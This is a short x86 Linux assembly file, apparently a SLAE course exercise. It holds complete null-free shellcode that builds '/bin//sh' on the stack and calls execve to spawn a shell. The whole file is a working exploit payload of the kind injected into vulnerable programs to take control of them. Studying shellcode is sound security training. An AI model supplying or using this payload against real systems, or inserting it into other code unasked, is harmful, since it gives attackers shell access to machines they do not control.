; SLAE - execve - /bin/sh/ (Linux/x86)
; Author: Dennis 'dhn' Herrmann
; Website: https://zer0-day.pw
; SLAE-721

BITS 32

global _start
section .text

; syscalls kernel
SYS_EXECVE equ 0x0b

_start:

	; execve("/bin//sh", 0, 0);
	xor eax, eax
	push eax
	push 0x68732f2f ; 'hs//'
	push 0x6e69622f ; 'nib/'
	mov ebx, esp
	mov ecx, eax
	mov al, SYS_EXECVE ; syscall execve
	int 0x80
